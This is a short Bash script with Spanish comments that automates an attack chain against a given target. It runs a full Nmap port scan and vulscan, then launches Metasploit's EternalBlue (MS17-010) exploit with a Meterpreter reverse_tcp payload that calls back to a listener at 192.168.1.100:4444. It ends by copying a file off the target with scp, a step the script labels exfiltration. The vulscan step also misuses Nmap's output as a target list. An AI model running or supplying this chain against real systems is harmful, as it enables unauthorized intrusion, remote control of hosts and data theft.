#!/bin/bash

# Verificar si se ha proporcionado un objetivo (IP o dominio)
if [ -z "$1" ]; then
    echo "Uso: $0 <objetivo>"
    exit 1
fi

# Definir la IP del objetivo
objetivo=$1

# Paso 1: Escaneo de puertos con Nmap
echo "[+] Escaneando puertos en $objetivo..."
nmap -p 1-65535 -T4 -A -v $objetivo > nmap_resultados.txt

# Paso 2: Buscar vulnerabilidades usando NSE Vulscan
echo "[+] Buscando vulnerabilidades en $objetivo..."
nmap --script vulscan/vulscan.nse -iL nmap_resultados.txt -oN vulscan_resultados.txt

# Paso 3: Intento de explotación con Metasploit (EternalBlue)
echo "[+] Intentando explotación de MS17-010 en $objetivo..."
msfconsole -q -x "
use exploit/windows/smb/ms17_010_eternalblue;
set RHOST $objetivo;
set PAYLOAD windows/x64/meterpreter/reverse_tcp;
set LHOST 192.168.1.100;
set LPORT 4444;
exploit;
exit;"

# Paso 4: Exfiltración de datos (simulado con SCP)
echo "[+] Exfiltrando archivos desde $objetivo..."
scp usuario@$objetivo:/ruta/al/archivo/de/interés.txt /ruta/local/

echo "[+] Secuencia de ataque completada."

## para ejecutar: chmod +x attack_sequence.sh && ./attack_sequence.sh 192.168.1.10